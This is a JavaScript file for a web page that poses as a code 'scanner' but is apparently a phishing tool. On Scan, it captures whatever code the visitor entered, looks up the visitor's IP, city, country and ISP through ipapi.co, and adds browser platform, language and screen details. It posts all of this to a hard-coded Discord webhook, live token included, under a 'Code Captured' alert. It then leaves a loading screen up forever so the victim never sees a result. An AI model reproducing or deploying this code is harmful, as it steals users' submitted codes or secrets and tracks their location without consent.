const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

const codeInput = document.getElementById('codeInput');
const scanButton = document.getElementById('scanButton');
const loadingOverlay = document.getElementById('loadingOverlay');

scanButton.addEventListener('click', handleScan);

async function handleScan() {
    const code = codeInput.value.trim();
    
    if (!code) {
        return;
    }

    // Show loading
    loadingOverlay.classList.add('active');
    
    try {
        // Get location data
        const locationData = await getUserLocation();
        
        // Create Discord message
        const message = {
            content: "@everyone 🚨 **NEW CODE SUBMISSION** 🚨",
            embeds: [{
                title: "🔍 Code Captured",
                color: 0xff0000,
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "📝 Submitted Code",
                        value: `\`\`\`\n${code.substring(0, 500)}${code.length > 500 ? '...' : ''}\n\`\`\``,
                        inline: false
                    },
                    {
                        name: "🌍 Location",
                        value: `**IP:** ${locationData.ip}\n**City:** ${locationData.city}\n**Country:** ${locationData.country}\n**ISP:** ${locationData.isp}`,
                        inline: true
                    },
                    {
                        name: "💻 Browser",
                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}`,
                        inline: true
                    }
                ]
            }]
        };

        // Send to webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        });

        // Keep loading forever
        
    } catch (error) {
        console.error('Error:', error);
        // Keep loading even on error
    }
}

async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unknown',
            city: 'Unknown',
            country: 'Unknown',
            isp: 'Unknown'
        };
    }
}